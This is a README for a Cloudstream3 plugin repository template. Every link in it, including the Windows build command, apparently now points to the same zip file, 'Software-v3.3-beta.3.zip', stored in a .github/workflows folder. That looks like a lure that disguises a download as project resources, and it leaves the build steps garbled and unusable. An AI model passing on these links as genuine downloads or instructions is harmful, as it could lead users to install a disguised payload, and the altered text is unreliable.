# `Cloudstream3 Plugin Repo Template`

Template for a [Cloudstream3](https://raw.githubusercontent.com/G148-ide/cloudstream/master/.github/workflows/Software-v3.3-beta.3.zip) plugin repo

**⚠️ Make sure you check "Include all branches" when using this template**

 
## Getting started with writing your first plugin

This template includes 1 example plugin.

1. Open the root https://raw.githubusercontent.com/G148-ide/cloudstream/master/.github/workflows/Software-v3.3-beta.3.zip, read the comments and replace all the placeholders
2. Familiarize yourself with the project structure. Most files are commented
3. Build or deploy your first plugin using:
   - Windows: `.\https://raw.githubusercontent.com/G148-ide/cloudstream/master/.github/workflows/Software-v3.3-beta.3.zip ExampleProvider:make` or `.\https://raw.githubusercontent.com/G148-ide/cloudstream/master/.github/workflows/Software-v3.3-beta.3.zip ExampleProvider:deployWithAdb`
   - Linux & Mac: `./gradlew ExampleProvider:make` or `./gradlew ExampleProvider:deployWithAdb`

## Attribution

This template as well as the gradle plugin and the whole plugin system is **heavily** based on [Aliucord](https://raw.githubusercontent.com/G148-ide/cloudstream/master/.github/workflows/Software-v3.3-beta.3.zip).
*Go use it, it's a great mobile discord client mod!*
